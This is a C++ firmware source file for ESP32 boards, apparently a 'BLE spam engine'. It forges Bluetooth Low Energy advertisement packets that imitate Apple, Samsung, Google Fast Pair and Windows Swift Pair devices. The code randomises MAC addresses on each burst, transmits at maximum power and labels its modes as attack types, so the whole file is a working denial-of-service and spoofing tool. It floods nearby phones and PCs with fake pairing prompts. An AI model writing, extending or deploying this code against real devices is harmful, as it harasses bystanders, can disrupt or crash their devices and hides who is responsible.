





















#include "ble_spam_engine.h"
#include "core/ble_service.h"

#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>
#include "nimble/nimble/host/include/host/ble_hs_id.h"

#if defined(CONFIG_IDF_TARGET_ESP32S3) || defined(CONFIG_IDF_TARGET_ESP32C3)
#define SPAM_MAX_TX_POWER ESP_PWR_LVL_P21
#else
#define SPAM_MAX_TX_POWER ESP_PWR_LVL_P9
#endif






static const uint8_t kNearbyActions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};
static const int kNearbyActionsCount = sizeof(kNearbyActions) / sizeof(kNearbyActions[0]);


static const char* kAppleActionNames[] = {
    "Apple TV Setup",    "Setup New Phone",   "Transfer Number",
    "TV Color Balance",  "Apple Vision Pro",  "Apple TV Connecting",
    "Apple TV Audio Sync", "Setup New Apple TV", "HomePod Setup",
    "HomeKit Apple TV",  "Pair Apple TV",     "Setup New iPad"
};
static const int kAppleActionCount = sizeof(kAppleActionNames) / sizeof(kAppleActionNames[0]);



struct AppleProximityDevice {
    const char* name;
    uint16_t    device_id;
};
static const AppleProximityDevice kAppleDevices[] = {
    {"AirPods Pro",               0x0E20},
    {"AirPods Pro 2nd Gen",       0x1420},
    {"AirPods Pro 2nd Gen USB-C", 0x2420},
    {"AirPods 4 ANC",             0x2820},
    {"AirPods 4",                 0x2920},
    {"AirPods Max USB-C",         0x2B20},
    {"Beats Powerbeats Pro 2",    0x2C20},
    {"Beats Solo 3",              0x0620},
    {"AirPods Max",               0x0A20},
    {"Beats Flex",                0x1020},
    {"AirTag",                    0x0055},
    {"Hermes AirTag",             0x0030},
    {"AirPods",                   0x0220},
    {"AirPods 2nd Gen",           0x0F20},
    {"AirPods 3rd Gen",           0x1320},
    {"Powerbeats 3",              0x0320},
    {"Powerbeats Pro",            0x0B20},
    {"Beats Solo Pro",            0x0C20},
    {"Beats Studio Buds",         0x1120},
    {"Beats X",                   0x0520},
    {"Beats Studio 3",            0x0920},
    {"Beats Studio Pro",          0x1720},
    {"Beats Fit Pro",             0x1220},
    {"Beats Studio Buds+",        0x1620},
    {"Beats Solo 4",              0x2520},
    {"Beats Solo Buds",           0x2620},
    {"Powerbeats Fit",            0x2F20},
};
static const int kAppleDeviceCount = sizeof(kAppleDevices) / sizeof(kAppleDevices[0]);


static const char* kAppleDeviceNamePtrs[kAppleDeviceCount];
static bool kAppleDeviceNamePtrsBuilt = false;


struct DeviceType { uint32_t value; };
static const DeviceType kAndroidModels[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x0A0000}, {0x00000B}, {0x0B0000}, {0x00000D},
    {0x000007}, {0x070000}, {0x000009}, {0x090000}, {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE},
    {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7}, {0x0577B1}, {0x05A9BC}, {0xCD8256},
    {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006},
    {0x060000}, {0xD446A7}, {0x2D7A23}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00001}, {0xF00201},
    {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963},
    {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, {0x06AE20},
    {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0},
    {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0}, {0x9ADB11}, {0x8B66AB}, {0xD99CA1}, {0x77FF67},
    {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F},
    {0xB37A62}, {0x92ADC9}
};
static const int kAndroidModelsCount = sizeof(kAndroidModels) / sizeof(kAndroidModels[0]);


static const uint8_t kWatchModels[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
    0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D,
    0x1E, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x40, 0x41, 0x42, 0x60, 0x61, 0x62,
};
static const int kWatchModelsCount = sizeof(kWatchModels) / sizeof(kWatchModels[0]);


static const uint32_t kBudsModels[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C,
    0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503, 0x2C6740,
    0x3F6718, 0x42C519, 0xAE073A, 0x011716, 0x123456, 0x654321, 0x789ABC, 0xDEF123,
    0x456789, 0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
};
static const int kBudsModelsCount = sizeof(kBudsModels) / sizeof(kBudsModels[0]);


static const char* kSamsungDeviceNames[] = {
    "Galaxy Buds", "Galaxy Watch", "Random / All"
};
static const int kSamsungDeviceCount = sizeof(kSamsungDeviceNames) / sizeof(kSamsungDeviceNames[0]);


static const char* kWindowsPresets[] = {
    "Generic Swift Pair",
    "Never Gonna Give You Up",
    "Bill Nye's iPhone",
    "Skibidi Toilet",
    "67",
    "FBI Surveillance Van"
};
static const int kWindowsPresetsCount = sizeof(kWindowsPresets) / sizeof(kWindowsPresets[0]);





static uint64_t s_rngState = 0;

static void seedRng() {
    uint64_t seed = ((uint64_t)esp_random() << 32) ^ esp_random();
    if (seed == 0) seed = 0x9E3779B97F4A7C15ULL;
    s_rngState = seed;
}

static uint64_t nextRand64() {
    if (s_rngState == 0) seedRng();
    uint64_t x = s_rngState;
    x ^= x >> 12;
    x ^= x << 25;
    x ^= x >> 27;
    s_rngState = x;
    return x * 0x2545F4914F6CDD1DULL;
}


static void fastRandomMac(uint8_t* mac) {
    uint64_t r1 = nextRand64();
    uint64_t r2 = nextRand64();
    mac[0] = (uint8_t)(r1 & 0xFF);
    mac[1] = (uint8_t)((r1 >> 8) & 0xFF);
    mac[2] = (uint8_t)((r1 >> 16) & 0xFF);
    mac[3] = (uint8_t)((r1 >> 24) & 0xFF);
    mac[4] = (uint8_t)(r2 & 0xFF);
    mac[5] = (uint8_t)((r2 >> 8) & 0xFF);

    mac[0] = (mac[0] & 0xFE) | 0x02;
}





static NimBLEAdvertising* s_pAdv    = nullptr;
static uint32_t            s_pktCount = 0;
static bool                s_initialized = false;






static void applyRandomMac() {
    uint8_t mac[6];
    fastRandomMac(mac);


    mac[5] |= 0xC0;

    ble_hs_id_set_rnd(mac);
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
}







static bool buildAppleAction(NimBLEAdvertisementData& adv) {
    uint8_t action = kNearbyActions[esp_random() % kNearbyActionsCount];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) flags--;
    if (action == 0x09 && (esp_random() & 1)) flags = 0x40;

    uint8_t buf[11];
    uint8_t i = 0;
    buf[i++] = 10;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;

    adv = NimBLEAdvertisementData();
    adv.setFlags(0x06);
    adv.addData(std::string((char*)buf, i));
    return true;
}



static bool buildAppleProximityPair(uint8_t prefix, uint16_t deviceId, NimBLEAdvertisementData& adv) {
    uint8_t buf[31];
    uint8_t i = 0;
    buf[i++] = 0x1E;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x07;
    buf[i++] = 0x19;
    buf[i++] = prefix;
    buf[i++] = (uint8_t)(deviceId >> 8);
    buf[i++] = (uint8_t)(deviceId & 0xFF);
    buf[i++] = 0x55;
    esp_fill_random(&buf[i], 3);
    i += 3;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);
    i += 16;

    adv = NimBLEAdvertisementData();
    adv.addData(std::string((char*)buf, i));
    return true;
}


static bool buildSamsungWatch(NimBLEAdvertisementData& adv) {
    uint8_t model = kWatchModels[esp_random() % kWatchModelsCount];
    uint8_t d[15] = {
        0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00,
        0x02, 0x00, 0x01, 0x01, 0xFF, 0x00,
        0x00, 0x43, model
    };
    adv = NimBLEAdvertisementData();
    adv.setFlags(0x06);
    adv.addData(std::string((char*)d, 15));
    return true;
}


static bool buildSamsungBuds(NimBLEAdvertisementData& adv) {
    uint32_t model = kBudsModels[esp_random() % kBudsModelsCount];
    uint8_t d[31];
    uint8_t i = 0;
    d[i++] = 27;   d[i++] = 0xFF; d[i++] = 0x75; d[i++] = 0x00;
    d[i++] = 0x42; d[i++] = 0x09; d[i++] = 0x81; d[i++] = 0x02;
    d[i++] = 0x14; d[i++] = 0x15; d[i++] = 0x03; d[i++] = 0x21;
    d[i++] = 0x01; d[i++] = 0x09;
    d[i++] = (model >> 16) & 0xFF;
    d[i++] = (model >> 8) & 0xFF;
    d[i++] = 0x01;
    d[i++] = model & 0xFF;
    d[i++] = 0x06; d[i++] = 0x3C; d[i++] = 0x94; d[i++] = 0x8E;
    d[i++] = 0x00; d[i++] = 0x00; d[i++] = 0x00; d[i++] = 0x00;
    d[i++] = 0xC7; d[i++] = 0x00;

    d[i++] = 0x10; d[i++] = 0xFF; d[i++] = 0x75;

    adv = NimBLEAdvertisementData();
    adv.addData(std::string((char*)d, i));
    return true;
}


static bool buildGoogleFastPair(NimBLEAdvertisementData& adv) {
    uint32_t model = kAndroidModels[esp_random() % kAndroidModelsCount].value;
    uint8_t d[14] = {
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        (uint8_t)((model >> 0x10) & 0xFF),
        (uint8_t)((model >> 0x08) & 0xFF),
        (uint8_t)((model >> 0x00) & 0xFF),
        0x02, 0x0A,
        (uint8_t)((esp_random() % 120) - 100)
    };
    adv = NimBLEAdvertisementData();
    adv.setFlags(0x06);
    adv.addData(std::string((char*)d, 14));
    return true;
}


static bool buildWindowsSwiftPair(int deviceIndex, NimBLEAdvertisementData& adv) {

    const char* name;
    char nameBuf[22] = {0};
    if (deviceIndex < 0 || deviceIndex >= kWindowsPresetsCount) {

        name = kWindowsPresets[esp_random() % kWindowsPresetsCount];
    } else {
        name = kWindowsPresets[deviceIndex];
    }

    uint8_t name_len = (uint8_t)strlen(name);
    if (name_len > 21) name_len = 21;


    uint8_t d[7 + 21];
    uint8_t i = 0;
    d[i++] = (uint8_t)(6 + name_len);
    d[i++] = 0xFF;
    d[i++] = 0x06;
    d[i++] = 0x00;
    d[i++] = 0x03;
    d[i++] = 0x00;
    d[i++] = 0x80;
    memcpy(&d[i], name, name_len);
    i += name_len;

    adv = NimBLEAdvertisementData();
    adv.setFlags(0x06);
    adv.addData(std::string((char*)d, i));
    return true;
}





static bool buildPacket(ble_spam_engine::AttackType type, int deviceIndex, NimBLEAdvertisementData& adv) {
    switch (type) {
        case ble_spam_engine::APPLE_ACTIONS:

            return buildAppleAction(adv);

        case ble_spam_engine::APPLE_DEVICES: {

            uint16_t devId;
            if (deviceIndex < 0 || deviceIndex >= kAppleDeviceCount) {
                devId = kAppleDevices[esp_random() % kAppleDeviceCount].device_id;
            } else {
                devId = kAppleDevices[deviceIndex].device_id;
            }
            return buildAppleProximityPair(0x01, devId, adv);
        }

        case ble_spam_engine::SAMSUNG: {

            bool sendBuds;
            if (deviceIndex == 2 || deviceIndex < 0) {
                sendBuds = (esp_random() & 1);
            } else if (deviceIndex == 0) {
                sendBuds = true;
            } else {
                sendBuds = false;
            }
            return sendBuds ? buildSamsungBuds(adv) : buildSamsungWatch(adv);
        }

        case ble_spam_engine::GOOGLE_FASTPAIR:
            return buildGoogleFastPair(adv);

        case ble_spam_engine::WINDOWS_SWIFT_PAIR:
            return buildWindowsSwiftPair(deviceIndex, adv);

        default:
            return false;
    }
}





namespace ble_spam_engine {

void init() {
    if (s_initialized) return;


    ble_service::pauseAdvertising();
    ble_service::setSuspended(true);


    delay(60);



    NimBLEDevice::init("");
    delay(5);


    NimBLEDevice::setPower(SPAM_MAX_TX_POWER, ESP_BLE_PWR_TYPE_DEFAULT);
    NimBLEDevice::setPower(SPAM_MAX_TX_POWER, ESP_BLE_PWR_TYPE_ADV);

    s_pAdv = NimBLEDevice::getAdvertising();
    if (s_pAdv) {

        s_pAdv->setMinInterval(32);
        s_pAdv->setMaxInterval(32);
    }

    seedRng();
    s_pktCount    = 0;
    s_initialized = true;
}

void deinit() {
    if (!s_initialized) return;

    if (s_pAdv) {
        s_pAdv->stop();
        delay(5);
        s_pAdv = nullptr;
    }


    ble_service::setSuspended(false);
    ble_service::resumeAdvertising();

    s_initialized = false;
}

static uint8_t s_burstCount = 0;
static const uint8_t kBurstLimit = 4;

void stopAdvertising() {
    if (s_pAdv) {
        s_pAdv->stop();
    }
    s_burstCount = kBurstLimit;
}

void sendPacket(AttackType attackType, int deviceIndex) {
    if (!s_initialized || !s_pAdv) return;

    s_pktCount++;
    s_burstCount++;




    if (s_burstCount >= kBurstLimit || !s_pAdv->isAdvertising()) {
        s_burstCount = 0;

        s_pAdv->stop();
        applyRandomMac();

        NimBLEAdvertisementData adv;
        if (!buildPacket(attackType, deviceIndex, adv)) return;

        static NimBLEAdvertisementData emptyScan;
        s_pAdv->setAdvertisementData(adv);
        s_pAdv->setScanResponseData(emptyScan);
        s_pAdv->start();
    }
}

uint32_t getPacketCount() { return s_pktCount; }
void resetPacketCount()   { s_pktCount = 0; }

const char* const* getAppleActionNames() { return kAppleActionNames; }
int getAppleActionCount() { return kAppleActionCount; }

const char* const* getAppleDeviceNames() {
    if (!kAppleDeviceNamePtrsBuilt) {
        for (int i = 0; i < kAppleDeviceCount; i++) {
            kAppleDeviceNamePtrs[i] = kAppleDevices[i].name;
        }
        kAppleDeviceNamePtrsBuilt = true;
    }
    return kAppleDeviceNamePtrs;
}
int getAppleDeviceCount() { return kAppleDeviceCount; }

const char* const* getSamsungDeviceNames() { return kSamsungDeviceNames; }
int getSamsungDeviceCount() { return kSamsungDeviceCount; }

}
